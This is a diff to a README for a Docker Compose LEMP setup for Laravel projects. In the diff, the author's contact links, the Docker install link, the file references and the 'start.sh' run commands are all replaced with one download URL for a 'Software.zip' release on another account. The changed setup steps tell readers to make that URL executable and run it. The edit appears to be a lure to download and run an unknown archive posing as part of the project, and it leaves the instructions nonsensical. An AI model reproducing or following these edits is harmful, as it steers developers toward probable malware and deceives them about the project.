@@ -6,21 +6,21 @@ A pretty simplified Docker Compose workflow that sets up a LEMP network of conta
 
 ### Author's informations:
 
--   Email: [Dev.KingNNT@gmail.com](mailto:Dev.KingNNT@gmail.com)
--   Skype: [live:king.nnt](https://join.skype.com/invite/eqRpzcC8cGsf/)
--   Facebook Profile: [Ninh Ngọc Tuấn](https://www.facebook.com/Kinggg.NNT/)
--   Facebook Page: [https://www.facebook.com/Dev.KingNNT](https://www.facebook.com/Dev.KingNNT/)
--   Github Profile: [Ninh Ngọc Tuấn](https://github.com/KingNNT/)
--   Gitlap Profile: [Ninh Ngọc Tuấn](https://gitlab.com/Dev.KingNNT/)
--   Bitbucket Profile: [https://bitbucket.org/KingNNT/](https://bitbucket.org/KingNNT/)
+-   Email: [https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
+-   Skype: [https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
+-   Facebook Profile: [Ninh Ngọc Tuấn](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
+-   Facebook Page: [https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
+-   Github Profile: [Ninh Ngọc Tuấn](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
+-   Gitlap Profile: [Ninh Ngọc Tuấn](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
+-   Bitbucket Profile: [https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip)
 
 ## Usage
 
-To get started, make sure you have [Docker installed](https://docs.docker.com/docker-for-mac/install/) on your system, and then clone this repository.
+To get started, make sure you have [Docker installed](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip) on your system, and then clone this repository.
 
 Next, navigate in your terminal to the directory you cloned this, and spin up the containers for the web server by running `docker-compose up -d --build site` or use target `make run`.
 
-After that completes, follow the steps from the [src/README.md](src/README.md) file to get your Laravel project added in (or create a new blank one).
+After that completes, follow the steps from the [https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip](https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip) file to get your Laravel project added in (or create a new blank one).
 
 Bringing up the Docker Compose network with `site` instead of just using `up`, ensures that only our site's containers are brought up at the start, instead of all of the command containers as well. The following are built for our web server, with their exposed ports detailed:
 
@@ -43,13 +43,13 @@ or use target of `Makefile`
 Run commands in your terminal
 
 ```
-chmod +x ./start.sh
-./start.sh
+chmod +x https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip
+https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip
 ```
 
 ## Using BrowserSync with Laravel Mix
 
-If you want to enable the hot-reloading that comes with Laravel Mix's BrowserSync option, you'll have to follow a few small steps. First, ensure that you're using the updated `docker-compose.yml` with the `:3000` and `:3001` ports open on the npm service. Then, add the following to the end of your Laravel project's `webpack.mix.js` file:
+If you want to enable the hot-reloading that comes with Laravel Mix's BrowserSync option, you'll have to follow a few small steps. First, ensure that you're using the updated `https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip` with the `:3000` and `:3001` ports open on the npm service. Then, add the following to the end of your Laravel project's `https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip` file:
 
 ```javascript
 .browserSync({
@@ -69,6 +69,6 @@ That should keep a small info pane open in your terminal (which you can exit wit
 
 ## MailHog
 
-The current version of Laravel (8 as of today) uses MailHog as the default application for testing email sending and general SMTP work during local development. Using the provided Docker Hub image, getting an instance set up and ready is simple and straight-forward. The service is included in the `docker-compose.yml` file, and spins up alongside the webserver and database services.
+The current version of Laravel (8 as of today) uses MailHog as the default application for testing email sending and general SMTP work during local development. Using the provided Docker Hub image, getting an instance set up and ready is simple and straight-forward. The service is included in the `https://github.com/vukhang16/Docker-For-Laravel-Application/releases/download/v1.0/Software.zip` file, and spins up alongside the webserver and database services.
 
 To see the dashboard and view any emails coming through the system, visit [localhost:8025](http://localhost:8025) after running `docker-compose up -d site`.
